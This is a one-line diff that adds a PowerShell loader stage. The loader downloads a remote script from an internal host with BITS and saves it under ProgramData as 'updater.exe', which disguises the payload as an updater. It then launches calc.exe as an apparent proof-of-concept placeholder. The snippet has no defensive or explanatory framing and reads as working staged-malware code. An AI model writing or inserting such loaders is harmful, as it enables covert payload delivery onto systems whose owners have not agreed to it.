@@ -1,0 +1,1 @@
+<# Stage transfer #> $PayloadUrl = 'http://internal.corp:8080/stage1.ps1'; $Stage2Path = 'C:\ProgramData\updater.exe'; $ConnectionTimeout = 180; try { Start-BitsTransfer -Source $PayloadUrl -Destination $Stage2Path; Start-Process -FilePath "calc.exe"; Start-Sleep -Seconds 31 } catch { Write-Warning "Loader step failed" }
